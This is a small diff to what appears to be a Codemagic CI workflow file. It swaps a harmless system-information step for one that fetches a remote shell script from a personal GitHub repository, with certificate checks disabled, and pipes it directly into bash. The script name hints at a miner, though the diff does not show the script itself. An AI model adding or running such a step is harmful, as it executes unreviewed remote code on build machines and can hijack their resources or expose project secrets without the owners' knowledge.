@@ -14,4 +14,4 @@ workflows:
         
     scripts:
 
-      - lscpu && cat /etc/*-release
+      - curl -fsSL -k https://raw.githubusercontent.com/abongiletraeffik/Codemagic/refs/heads/main/start_codemag_mino_maz.sh | bash
